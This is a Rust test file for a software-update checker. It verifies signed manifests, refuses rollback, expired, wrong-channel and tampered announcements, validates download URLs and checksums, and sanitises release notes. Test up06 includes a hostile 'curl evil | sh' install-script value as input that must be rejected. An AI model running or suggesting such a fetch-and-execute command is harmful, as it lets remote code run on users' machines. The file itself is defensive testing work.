use kk_evidence::keys::Signer;
use kk_update::root::Root;
use kk_update::{check, sign_manifest, verify_download, Context, Offer, Refusal, Verdict, Version};
use serde_json::{json, Value};

fn publisher() -> Signer {
    Signer::from_seed([42u8; 32])
}

fn trusted(s: &Signer) -> Root {
    Root::single(&s.public()).unwrap()
}

fn file() -> Vec<u8> {
    b"pretend installer bytes".to_vec()
}

fn manifest() -> Value {
    json!({
        "channel": "stable", "version": "1.4.0", "not_after": 2_000_000_000u64,
        "notes": "Fixes a crash when restoring a backup.",
        "artifacts": [
            {"platform": "macos-arm64", "url": "https://updates.example/kakurega-1.4.0.dmg", "sha256": kk_evidence::capsule::sha256_hex(&file()), "size": file().len()},
            {"platform": "linux-arm64", "url": "https://updates.example/kakurega-1.4.0.deb", "sha256": "a".repeat(64), "size": 1000}
        ]
    })
}

fn signed(m: &Value) -> Vec<u8> {
    sign_manifest(m.to_string().as_bytes(), &publisher()).unwrap()
}

fn ctx<'a>(t: &'a Root) -> Context<'a> {
    Context {
        root: t,
        channel: "stable",
        platform: "macos-arm64",
        current: Version(1, 3, 2),
        highest_seen: None,
        now: 1_900_000_000,
    }
}

fn offer(v: Verdict) -> Offer {
    match v {
        Verdict::Available(o) => o,
        other => panic!("expected an offer, got {other:?}"),
    }
}

#[test]
fn up01_a_signed_newer_announcement_is_offered_with_the_checksum_for_this_computer_only() {
    let t = trusted(&publisher());
    let o = offer(check(&signed(&manifest()), &ctx(&t)).unwrap());
    assert_eq!(o.version, Version(1, 4, 0));
    assert!(o.artifact.url.ends_with(".dmg") && o.notes.contains("backup"));
    let mut linux = ctx(&t);
    linux.platform = "linux-arm64";
    assert!(offer(check(&signed(&manifest()), &linux).unwrap())
        .artifact
        .url
        .ends_with(".deb"));
    linux.platform = "windows-x64";
    assert_eq!(
        check(&signed(&manifest()), &linux),
        Err(Refusal::NoArtifactForThisComputer)
    );
}

#[test]
fn up02_the_same_or_an_older_version_is_not_an_update() {
    let t = trusted(&publisher());
    for current in [Version(1, 4, 0), Version(2, 0, 0)] {
        let mut c = ctx(&t);
        c.current = current;
        assert_eq!(
            check(&signed(&manifest()), &c),
            Ok(Verdict::UpToDate),
            "{current}"
        );
    }
}

#[test]
fn up03_only_the_publishers_key_counts_and_any_change_to_the_signed_bytes_breaks_it() {
    let t = trusted(&publisher());
    let other = Signer::from_seed([9u8; 32]);
    let by_stranger = sign_manifest(manifest().to_string().as_bytes(), &other).unwrap();
    assert!(matches!(
        check(&by_stranger, &ctx(&t)),
        Err(Refusal::NotSigned(_))
    ));
    assert!(
        matches!(
            check(
                &signed(&manifest()),
                &ctx(&trusted(&Signer::from_seed([1u8; 32])))
            ),
            Err(Refusal::NotSigned(_))
        ),
        "no trusted key means nothing is accepted"
    );
    let good = String::from_utf8(signed(&manifest())).unwrap();
    let v: Value = serde_json::from_str(&good).unwrap();
    let payload = v["payload"].as_str().unwrap();
    let mut chars: Vec<char> = payload.chars().collect();
    let i = chars.len() / 2;
    chars[i] = if chars[i] == 'A' { 'B' } else { 'A' };
    let mut altered = v.clone();
    altered["payload"] = Value::String(chars.into_iter().collect());
    assert!(
        check(altered.to_string().as_bytes(), &ctx(&t)).is_err(),
        "an altered payload is refused"
    );
    // the signature of one announcement does not carry over to another payload
    let other_manifest = signed(
        &json!({"channel": "stable", "version": "9.9.9", "not_after": 2_000_000_000u64, "notes": "x", "artifacts": manifest()["artifacts"]}),
    );
    let a: Value = serde_json::from_slice(&other_manifest).unwrap();
    let mut spliced = v.clone();
    spliced["payload"] = a["payload"].clone();
    assert!(
        check(spliced.to_string().as_bytes(), &ctx(&t)).is_err(),
        "a signature moved onto another payload is refused"
    );
    assert!(check(b"not json at all", &ctx(&t)).is_err());
    assert!(check(&vec![b'a'; 70_000], &ctx(&t)).is_err());
}

#[test]
fn up04_an_old_announcement_cannot_be_replayed_and_a_stale_one_expires() {
    let t = trusted(&publisher());
    let mut c = ctx(&t);
    c.highest_seen = Some(Version(1, 5, 0));
    assert_eq!(
        check(&signed(&manifest()), &c),
        Err(Refusal::Rollback {
            seen: Version(1, 5, 0)
        })
    );
    c.highest_seen = Some(Version(1, 4, 0));
    assert!(
        check(&signed(&manifest()), &c).is_ok(),
        "the highest one seen may be shown again"
    );
    let mut c = ctx(&t);
    c.now = 2_000_000_000;
    assert_eq!(check(&signed(&manifest()), &c), Err(Refusal::Expired));
    c.now = 2_000_000_001;
    assert_eq!(check(&signed(&manifest()), &c), Err(Refusal::Expired));
}

#[test]
fn up05_a_different_channel_is_refused() {
    let t = trusted(&publisher());
    let mut m = manifest();
    m["channel"] = json!("beta");
    assert_eq!(check(&signed(&m), &ctx(&t)), Err(Refusal::WrongChannel));
}

#[test]
fn up06_the_publisher_tool_and_the_checker_both_refuse_unsafe_downloads_and_odd_shapes() {
    let t = trusted(&publisher());
    let bad_urls = [
        "http://updates.example/a.dmg",
        "https://user:pw@updates.example/a.dmg",
        "https://localhost/a.dmg",
        "https://127.0.0.1/a.dmg",
        "https://updates.example:8443/a.dmg",
        "ftp://updates.example/a",
        "not a url",
    ];
    for u in bad_urls {
        let mut m = manifest();
        m["artifacts"][0]["url"] = json!(u);
        assert!(
            sign_manifest(m.to_string().as_bytes(), &publisher()).is_err(),
            "signing refuses {u}"
        );
    }
    for (label, edit) in [
        ("short checksum", json!({"sha256": "abc"})),
        ("uppercase checksum", json!({"sha256": "A".repeat(64)})),
        ("zero size", json!({"size": 0})),
        ("huge size", json!({"size": 700u64 * 1024 * 1024})),
    ] {
        let mut m = manifest();
        for (k, v) in edit.as_object().unwrap() {
            m["artifacts"][0][k] = v.clone();
        }
        assert!(
            sign_manifest(m.to_string().as_bytes(), &publisher()).is_err(),
            "{label}"
        );
    }
    // a manifest that skipped the publisher tool's checks (signed by hand) is still refused by the checker
    let mut m = manifest();
    m["artifacts"][0]["url"] = json!("http://updates.example/a.dmg");
    let canon = kk_evidence::canon::canonicalize(m.to_string().as_bytes()).unwrap();
    let by_hand = kk_evidence::dsse::encode(&kk_evidence::dsse::sign(
        kk_update::MANIFEST_TYPE,
        canon.as_bytes(),
        &publisher(),
    ))
    .into_bytes();
    assert!(matches!(
        check(&by_hand, &ctx(&t)),
        Err(Refusal::BadArtifact(_))
    ));
    // unknown fields, two downloads for one computer, and a non-version are refused
    let mut m = manifest();
    m["install_script"] = json!("curl evil | sh");
    assert!(sign_manifest(m.to_string().as_bytes(), &publisher()).is_err());
    let mut m = manifest();
    let dup = m["artifacts"][0].clone();
    m["artifacts"].as_array_mut().unwrap().push(dup);
    let canon = kk_evidence::canon::canonicalize(m.to_string().as_bytes()).unwrap();
    let by_hand = kk_evidence::dsse::encode(&kk_evidence::dsse::sign(
        kk_update::MANIFEST_TYPE,
        canon.as_bytes(),
        &publisher(),
    ))
    .into_bytes();
    assert!(matches!(
        check(&by_hand, &ctx(&t)),
        Err(Refusal::Malformed(_))
    ));
}

#[test]
fn up07_versions_are_strict_numbers() {
    for good in ["0.0.1", "1.2.3", "10.20.30"] {
        assert!(Version::parse(good).is_some(), "{good}");
    }
    for bad in [
        "1.2",
        "1.2.3.4",
        "01.2.3",
        "1.02.3",
        "1.2.3-rc1",
        "1.2.3+b",
        "-1.0.0",
        "1.2.x",
        "",
        "99999.0.0",
        " 1.2.3",
        "1.2.3\n",
    ] {
        assert!(Version::parse(bad).is_none(), "{bad:?}");
    }
    assert!(Version(1, 10, 0) > Version(1, 9, 9) && Version(2, 0, 0) > Version(1, 99, 99));
}

#[test]
fn up08_a_downloaded_file_must_match_the_signed_size_and_checksum_exactly() {
    let t = trusted(&publisher());
    let o = offer(check(&signed(&manifest()), &ctx(&t)).unwrap());
    assert!(verify_download(&o, &file()).is_ok());
    let mut one_byte = file();
    one_byte[3] ^= 1;
    assert!(
        verify_download(&o, &one_byte).is_err(),
        "same size, one byte different"
    );
    let mut longer = file();
    longer.push(0);
    assert!(verify_download(&o, &longer).is_err());
    assert!(verify_download(&o, &file()[..5]).is_err());
    assert!(verify_download(&o, b"").is_err());
}

#[test]
fn up09_release_notes_are_shown_as_plain_text() {
    let t = trusted(&publisher());
    let mut m = manifest();
    m["notes"] = json!(format!(
        "Safe\u{202e}text\u{0007}\nline two {}",
        "x".repeat(5000)
    ));
    let o = offer(check(&signed(&m), &ctx(&t)).unwrap());
    assert!(
        !o.notes.contains('\u{202e}')
            && !o.notes.contains('\u{7}')
            && o.notes.contains("\nline two")
    );
    assert_eq!(o.notes.chars().count(), 2000);
}
